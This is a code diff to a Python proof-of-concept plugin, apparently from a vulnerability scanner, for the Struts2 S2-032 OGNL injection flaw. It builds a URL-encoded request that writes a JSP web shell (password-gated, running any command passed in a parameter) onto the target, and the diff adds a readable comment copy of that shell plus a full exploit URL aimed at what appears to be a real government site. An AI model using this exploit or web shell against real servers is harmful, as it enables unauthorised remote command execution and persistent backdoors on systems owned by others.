@@ -29,6 +29,17 @@ class P(T):
         result['result']=False
         res=None
         jsp_file = str(random.randint(1000, 1000000)) + '.jsp'
+        # gif89a<% if("024".equals(request.getParameter("pwd"))){
+        #       java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("l")).getInputStream();
+        #       int a = -1;
+        #       byte[] b = new byte[2048];
+        #       out.print("<pre>");
+        #       while((a=in.read(b))!=-1){
+        #           out.println(new String(b));
+        #       }
+        #       out.print(</pre>");
+        #     }
+        # %>
         content = 'gif89a%3C%25%0A%20%20%20%20if%28%22024%22.equals%28request.' \
               'getParameter%28%22pwd%22%29%29%29%7B%0A%20%20%20%20%20%20%2' \
               '0%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime%28%' \
@@ -55,22 +66,22 @@ class P(T):
               "er.HttpServletResponse&reqobj=%2f&reqobj={filename}&content={" \
               "content}".format(url=target_url, filename=jsp_file, content=content)
 
-	# 'http://www.dcqjw.gov.cn:80/sflogin_usercenter.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=#parameters.reqobj[0],#c=#parameters.reqobj[1],#req=#context.get(#a),#b=#req.getRealPath(#c)+#parameters.reqobj[2],#fos=new:java.io.FileOutputStream(#b),#fos.write(#parameters.content[0].getBytes()),#fos.close(),#hh=#context.get(#parameters.rpsobj[0]),#hh.getWriter().println(#b),#hh.getWriter().flush(),#hh.getWriter().close(),1?#xx:#request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=/&reqobj=32203.jsp&content=gif89a<%\n    if("024".equals(request.getParameter("pwd"))){\n        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("l")).getInputStream();\n        int a = -1;\n        byte[] b = new byte[2048];\n        out.print("<pre>");\n        while((a=in.read(b))!=-1){\n            out.println(new String(b));\n        }\n        out.print("</pre>");\n    }\n%>'
+# 'http://www.dcqjw.gov.cn:80/sflogin_usercenter.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=#parameters.reqobj[0],#c=#parameters.reqobj[1],#req=#context.get(#a),#b=#req.getRealPath(#c)+#parameters.reqobj[2],#fos=new:java.io.FileOutputStream(#b),#fos.write(#parameters.content[0].getBytes()),#fos.close(),#hh=#context.get(#parameters.rpsobj[0]),#hh.getWriter().println(#b),#hh.getWriter().flush(),#hh.getWriter().close(),1?#xx:#request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=/&reqobj=32203.jsp&content=gif89a<%\n    if("024".equals(request.getParameter("pwd"))){\n        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("l")).getInputStream();\n        int a = -1;\n        byte[] b = new byte[2048];\n        out.print("<pre>");\n        while((a=in.read(b))!=-1){\n            out.println(new String(b));\n        }\n        out.print("</pre>");\n    }\n%>'
 	user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
 	headers = { 'User-Agent' : user_agent }
-        print target_url
+        # print target_url
         try:
-            res=urllib2.urlopen(poc_url,timeout=timeout)
+            res=urllib2.urlopen(poc_url, timeout=timeout)
             res_html = res.read()
-    	except (IOError, httplib.HTTPException):
-	    print traceback.print_exc()
+        except (IOError, httplib.HTTPException):
+            print traceback.print_exc()
             return result
         finally:
             if res is not None:
                 res.close()
                 del res
         if jsp_file in res_html:
-	    cprint(target_url + '存在structs2032漏洞', 'red')
+            cprint(target_url + '存在structs2032漏洞', 'red')
             info = target_url + "struts2032  Vul"
             result['result']=True
             result['VerifyInfo'] = {}
